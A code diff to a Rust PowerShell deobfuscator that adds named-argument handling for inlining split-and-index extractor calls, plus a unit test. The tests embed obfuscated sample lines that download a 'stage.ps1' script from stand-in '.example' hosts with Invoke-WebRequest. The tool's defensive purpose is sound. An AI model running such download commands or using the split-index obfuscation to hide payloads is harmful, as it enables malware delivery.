@@ -3407,7 +3407,15 @@ fn expand_literal_split_index_extractor_calls(text: &str) -> String {
             continue;
         };
 
-        out = inline_ps_literal_split_index_calls(&out, &name, value_idx, sep_idx, index_idx);
+        let binding = PsSplitExtractorParamBinding {
+            value_idx,
+            value_name: value_var,
+            sep_idx,
+            sep_name: sep_var,
+            index_idx,
+            index_name: index_var,
+        };
+        out = inline_ps_literal_split_index_calls(&out, &name, binding);
     }
     out
 }
@@ -4172,9 +4180,7 @@ impl PsTrimKind {
 fn inline_ps_literal_split_index_calls(
     text: &str,
     name: &str,
-    value_idx: usize,
-    sep_idx: usize,
-    index_idx: usize,
+    binding: PsSplitExtractorParamBinding<'_>,
 ) -> String {
     let lower = text.to_ascii_lowercase();
     let needle_name = name.to_ascii_lowercase();
@@ -4201,6 +4207,21 @@ fn inline_ps_literal_split_index_calls(
         if parenthesized {
             pos = skip_ascii_ws(bytes, pos + 1);
         }
+        if bytes.get(pos) == Some(&b'-') {
+            if let Some((call_end, replacement)) = inline_ps_named_literal_split_index_call(
+                text,
+                pos,
+                parenthesized,
+                binding.value_name,
+                binding.sep_name,
+                binding.index_name,
+            ) {
+                matches.push((call_start, call_end, replacement));
+                search_from = call_end;
+                match_count += 1;
+                continue;
+            }
+        }
         let Some((first_end, first)) = parse_ps_literal_or_usize_arg(text, pos) else {
             search_from = end_name;
             continue;
@@ -4226,15 +4247,24 @@ fn inline_ps_literal_split_index_calls(
         }
 
         let args = [first, second, third];
-        let Some(value) = args.get(value_idx).and_then(PsLiteralOrUsizeArg::as_str) else {
+        let Some(value) = args
+            .get(binding.value_idx)
+            .and_then(PsLiteralOrUsizeArg::as_str)
+        else {
             search_from = call_end;
             continue;
         };
-        let Some(sep) = args.get(sep_idx).and_then(PsLiteralOrUsizeArg::as_str) else {
+        let Some(sep) = args
+            .get(binding.sep_idx)
+            .and_then(PsLiteralOrUsizeArg::as_str)
+        else {
             search_from = call_end;
             continue;
         };
-        let Some(index) = args.get(index_idx).and_then(PsLiteralOrUsizeArg::as_usize) else {
+        let Some(index) = args
+            .get(binding.index_idx)
+            .and_then(PsLiteralOrUsizeArg::as_usize)
+        else {
             search_from = call_end;
             continue;
         };
@@ -4265,6 +4295,51 @@ fn inline_ps_literal_split_index_calls(
         out.replace_range(start..end, &replacement);
     }
     out
+}
+
+#[derive(Clone, Copy)]
+struct PsSplitExtractorParamBinding<'a> {
+    value_idx: usize,
+    value_name: &'a str,
+    sep_idx: usize,
+    sep_name: &'a str,
+    index_idx: usize,
+    index_name: &'a str,
+}
+
+fn inline_ps_named_literal_split_index_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    sep_name: &str,
+    index_name: &str,
+) -> Option<(usize, String)> {
+    let (call_end, args) =
+        parse_ps_named_static_literal_or_usize_args(text, pos, parenthesized, 6)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_literal()?;
+    let sep = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(sep_name))?
+        .1
+        .as_literal()?;
+    let index = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(index_name))?
+        .1
+        .as_usize()?;
+    if value.len() > 8192 || sep.is_empty() {
+        return None;
+    }
+    let part = value.split(sep).nth(index)?;
+    if part.len() > 8192 {
+        return None;
+    }
+    Some((call_end, format!("'{}'", part.replace('\'', "''"))))
 }
 
 enum PsLiteralOrUsizeArg {
@@ -7098,6 +7173,23 @@ Piece 'noise|Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-split-extractor.example/stage.ps1'"),
             "split-index extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_split_index_extractor_named_args_call_is_rewritten() {
+        let text = r#"function Piece($value,$sep,$index) {
+  return $value.Split($sep)[$index]
+}
+Piece -index 1 -value 'noise|Invoke-WebRequest -Uri https://ps-split-named-args-extractor.example/stage.ps1|tail' -sep '|'"#;
+
+        let out = expand_literal_split_index_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-split-named-args-extractor.example/stage.ps1'"
+            ),
+            "named-argument split-index extractor call was not rewritten:\n{out}"
         );
     }
 
